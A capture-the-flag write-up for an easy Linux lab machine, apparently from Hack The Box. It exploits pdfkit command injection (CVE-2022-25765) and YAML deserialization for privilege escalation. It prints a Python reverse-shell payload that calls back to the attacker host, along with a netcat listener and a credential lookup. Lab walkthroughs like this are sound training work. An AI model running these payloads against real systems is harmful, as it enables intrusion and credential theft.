# Precious Machine Writeup - Easy

## Overview
Machine OS: Linux

Difficulty: Easy

![image](https://user-images.githubusercontent.com/99826925/212559935-cadec647-87aa-4757-9643-42e7d8ad8c7c.png)

## Enumeration

The first step I made, as usual, scan for open ports and look for anything suspicious.

For this reason, I used the following command:

└─$ nmap -sC -sV 10.10.11.189 

![1](https://user-images.githubusercontent.com/99826925/212559647-3abcf2f0-74bb-4740-8e52-83c328c07da5.PNG)

We can only find the ssh and web application running on both 22 and 80 ports.
Even after trying to fuzz for subdomains, we had nothing interesting.
So let's jump to our browser and have a look at the website.

## Look inside the webpage

![image](https://user-images.githubusercontent.com/99826925/212560106-7d104529-4f17-4761-b7e6-ffa8d3f1ec85.png)

It looks like this web page converts a website that a user provides to a PDF document.
I tried to see how it works. For this reason, I started a http server with python.

![image](https://user-images.githubusercontent.com/99826925/212560283-0bd57637-87ec-40fe-bc34-a68d259972e2.png)

![image](https://user-images.githubusercontent.com/99826925/212560366-f5162a10-90a1-4661-9c63-7296d525220f.png)

Our server is ready to be converted to PDF. I pasted the URL and the website generated a PDF File.

## Getting user access

Analyzing the PDF, I used Exiftool on the generated PDF to find that it's using "pdfkit v0.8.6".

I went to google to see if we can use a CVE for this version, to find that this version is vulnerable to Command Injection 'CVE-2022-25765'
An application could be vulnerable if it tries to render a URL that contains query string parameters with user input.

For more info visit : https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

I edited the URL Provided to add a parameter and see if I can execute a system command to make it look like :
http://10.10.**.**/?name=%20'whoami'
The resulted PDF:

![image](https://user-images.githubusercontent.com/99826925/212561063-d0dd0cb4-d098-475a-ab2b-1cc97690c4d6.png)

So it's working ! I know I can inject system commands, so I generated a reverse shell using https://www.revshells.com/ and pasted it in my URL's parameter:

```http://10.10.**.**/?name='python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.**.**",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")''```
and on my side, I had a NetCat listener :

└─$ nc -lvnp 4444

![image](https://user-images.githubusercontent.com/99826925/212561720-26b03023-7614-4474-9b9c-6cc220c4156f.png)

![image](https://user-images.githubusercontent.com/99826925/212561756-c61e1fb2-f6f5-476e-9556-9febb9a5c829.png)

Nice ! we got our hands on the shell.

Listing the home directory, I found there is a user called 'henry'. And after spending some time looking in the files and folders, I was able to find henry's credentials in .bundle/config file.

![image](https://user-images.githubusercontent.com/99826925/212561910-77201647-e539-4cde-9b04-b00ab7c5a0c9.png)

Using those credentials, I was able to SSH through henry's user and get the user flag.

![image](https://user-images.githubusercontent.com/99826925/212562543-bc07389d-79b5-4ae6-aa04-49e75a9cef24.png)

## Privilege Escalation

The first step I usually do, is to run ```sudo -l``` to see if we have any files we can run as root.

![image](https://user-images.githubusercontent.com/99826925/212562593-a0d02d64-1bf3-464e-9c00-c500adffb2ca.png)

looking inside the update_dependencies.rb, we notice that it is calling ```yaml.load()``` function, which seems to be vulnerable to Blind Remote Code Execution through YAML Deserialization

For more info : https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

![image](https://user-images.githubusercontent.com/99826925/212562617-077c08ad-c505-454c-950f-f675b6eeb011.png)

I used the script provided in the link above to make the dependencies.yml file and made a system command in the git_set param and inserted ```whoami```:

![image](https://user-images.githubusercontent.com/99826925/212562671-45a76150-12ab-4b7d-bee8-9e2031c5ed09.png)

Let's see what happens when we run the ruby file :

![image](https://user-images.githubusercontent.com/99826925/212563443-7b0cf5af-0014-425a-86db-8c8eedf212bc.png)

the server is executing what we provide in the git_set param !
Now let’s see if we can change the permissions of the /bin/bash directory so that we can elevate our privileges:

![image](https://user-images.githubusercontent.com/99826925/212563592-78f01a26-1168-4f73-ba78-1198cc2be6de.png)

Running again:

![image](https://user-images.githubusercontent.com/99826925/212563640-058a8393-1e14-4a69-8254-a18757efbaf6.png)

let's see now if we could put our hands on the root user :

![image](https://user-images.githubusercontent.com/99826925/212563672-88408adc-24be-497c-bded-b75fdbfc4ede.png)

It worked ! now let's claim our prize and have that root flag!

![image](https://user-images.githubusercontent.com/99826925/212563698-6e83d448-2e23-4f2f-a9f8-d5d0c1a52210.png)


 




